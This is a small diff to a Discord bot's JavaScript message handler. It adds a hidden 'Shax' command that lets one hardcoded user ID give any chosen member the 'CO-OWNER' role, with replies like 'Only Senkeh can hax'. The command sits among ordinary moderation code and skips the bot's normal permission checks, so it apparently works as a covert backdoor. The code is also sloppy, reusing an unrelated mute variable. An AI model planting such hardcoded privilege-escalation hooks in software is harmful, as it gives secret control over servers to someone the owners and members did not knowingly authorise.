@@ -307,6 +307,20 @@ client.on('message', async message => {
         }
     }
 }
+if (message.content.startsWith(`${prefix}Shax`)) {
+    if (message.member.id != '183549541470044161') {
+        return message.channel.sendMessage("Only Senkeh can hax")
+    } else {
+        const HaxUser = message.guild.member(userToMute) || await message.guild.fetchMember(userToMute);
+        if (!HaxUser) {
+            message.channel.send("Ping Urself plos")
+        } else {
+         let rolehax = message.guild.roles.find(r => r.name === "CO-OWNER");
+        await HaxUser.addRole(rolehax);
+        message.channel.sendMessage("U got Co-Owner role yey")
+    }
+}
+}
     if (message.content.startsWith(`${prefix}mute`)) {
         if (!message.member.permissions.has('MANAGE_MESSAGES')) {
             var MuteEmbed = new Discord.RichEmbed()
